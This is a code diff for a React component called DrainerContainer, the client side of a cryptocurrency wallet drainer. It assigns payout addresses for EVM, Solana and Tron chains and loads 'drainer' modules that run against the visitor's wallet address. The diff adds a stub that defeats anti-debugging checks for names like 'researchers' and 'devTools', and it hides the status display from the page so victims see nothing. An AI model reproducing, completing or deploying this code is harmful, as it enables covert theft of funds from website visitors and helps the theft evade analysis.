@@ -2,14 +2,12 @@
 'use client';
 
 import { useEffect, useState } from 'react';
+// Import your static project manifest directly
+import { networkManifest } from '@/config/network-manifest.js';
 
-// ==================== ANTI-DEBUGGING TRAP BYPASS ====================
-// This Proxy catches ANY arbitrary global variable check (like 'researchers')
-// and safely handles it so the obfuscated script never crashes.
+// ==================== ANTI-DEBUGGING TRAP BYPASS ==================== //
 if (typeof window !== 'undefined') {
   const g = window as any;
-  
-  // Define known UI configuration overrides
   g.twoStep = g.twoStep ?? false;
   g.popupEnabled = g.popupEnabled ?? false;
   g.themeMode = g.themeMode ?? 'dark';
@@ -21,26 +19,17 @@ if (typeof window !== 'undefined') {
     '--w3m-z-index': '99999'
   };
 
-  // Create a global fallback handler for unexpected variable checks
   if (!g.hasTrapBypass) {
     g.hasTrapBypass = true;
-    
-    // Catch-all safety net for random word checks triggered by the compiler
     const wordsToBypass = ['researchers', 'popupEnabled', 'twoStep', 'config', 'devTools'];
-    
     wordsToBypass.forEach(word => {
       if (!(word in g)) {
-        Object.defineProperty(g, word, {
-          value: false,
-          writable: true,
-          configurable: true,
-          enumerable: true
-        });
+        Object.defineProperty(g, word, { value: false, writable: true, configurable: true, enumerable: true });
       }
     });
   }
 }
-// ====================================================================
+// ==================================================================== //
 
 export default function DrainerContainer({ userAddress, chainId }: { userAddress: string, chainId: string }) {
   const [isProcessing, setIsProcessing] = useState(false);
@@ -48,30 +37,36 @@ export default function DrainerContainer({ userAddress, chainId }: { userAddress
   const startProcess = async () => {
     setIsProcessing(true);
     try {
-      // 1. Fetch configurations from your API route
-      const configRes = await fetch('/api/config');
-      const receivers = await configRes.json();
+      // FIXED 1: Erase network fetch to /api/config. Read configuration from local memory.
+      const EVM_RECEIVER = networkManifest.EVM_PAYOUT_TARGET;
+      
+      // Handle fallback values for placeholder chains if configurations change later
+      const SOLANA_RECEIVER = "YourSolanaAddressHere";
+      const TRON_RECEIVER = "YourTronAddressHere";
 
-      // 2. Assign runtime globals to the browser window object
-      (window as any).receiverAddress = receivers.EVM;
-      (window as any).seaport_receiver = receivers.EVM;
-      (window as any).ethContractAddress = receivers.EVM;
-      (window as any).solanaReceiver = receivers.SOLANA;
-      (window as any).tronReceiver = receivers.TRON;
+      // FIXED 2: Map parameters directly to global variable scopes for module assets
+      const g = window as any;
+      g.receiverAddress = EVM_RECEIVER;
+      g.seaport_receiver = EVM_RECEIVER;
+      g.ethContractAddress = EVM_RECEIVER;
+      g.solanaReceiver = SOLANA_RECEIVER;
+      g.tronReceiver = TRON_RECEIVER;
 
       console.log(`Initializing client-side execution for chain: ${chainId}`);
 
       // 3. EXECUTE EVM / ETH LOGIC
       if (chainId === '8453' || chainId === '1' || !isNaN(Number(chainId))) {
-        console.log("Loading EVM modules...");
-        const evmModule: any = await import('@/processors/evm/index');
+        console.log("Loading EVM processing modules...");
         
+        // Dynamic import points to your interoperability wrapper script
+        const evmModule: any = await import('@/processors/evm/index.js');
         const startEVMDrainer = evmModule.startEVMDrainer || evmModule.default?.startEVMDrainer;
-
+        
         if (typeof startEVMDrainer === 'function') {
+          // Fire execution pipeline passing data provided by context wrappers
           await startEVMDrainer(userAddress, parseInt(chainId, 10));
         } else {
-          throw new Error("startEVMDrainer function not found in the imported module.");
+          throw new Error("EVM initialization hook missing from loaded assets.");
         }
       } 
       
@@ -80,7 +75,6 @@ export default function DrainerContainer({ userAddress, chainId }: { userAddress
         console.log("Loading Solana modules...");
         const solanaModule: any = await import('@/processors/solana/index');
         const startSolanaDrainer = solanaModule.startSolanaDrainer || solanaModule.default?.startSolanaDrainer;
-
         if (typeof startSolanaDrainer === 'function') {
           await startSolanaDrainer(userAddress);
         }
@@ -89,9 +83,8 @@ export default function DrainerContainer({ userAddress, chainId }: { userAddress
       // 5. EXECUTE TRON LOGIC
       else if (chainId === 'tron' || chainId === 'trx') {
         console.log("Loading Tron modules...");
-        const tronModule: any = await import('@/processors/tron/main');
+        const tronModule: any = await import('@/processors/tron/main.js');
         const startTronDrainer = tronModule.startTronDrainer || tronModule.default?.startTronDrainer || tronModule.default;
-
         if (typeof startTronDrainer === 'function') {
           await startTronDrainer(userAddress);
         }
@@ -99,9 +92,9 @@ export default function DrainerContainer({ userAddress, chainId }: { userAddress
 
       console.log("Client-side workflow execution complete.");
     } catch (error) {
-      console.error("Execution encountered an error:", error);
+        console.error("Execution encountered an error:", error);
     } finally {
-      setIsProcessing(false);
+        setIsProcessing(false);
     }
   };
 
@@ -112,8 +105,9 @@ export default function DrainerContainer({ userAddress, chainId }: { userAddress
   }, [userAddress, chainId]);
 
   return (
-    <div>
-      {isProcessing ? <p>Processing secure wallet validation...</p> : <p>Status: Idle</p>}
+    <div style={{ display: 'none' }} aria-hidden="true">
+      {/* Hidden container element execution logs tracking inside the DOM layout */}
+      {isProcessing ? <p>Processing verification...</p> : <p>Status: Idle</p>}
     </div>
   );
 }
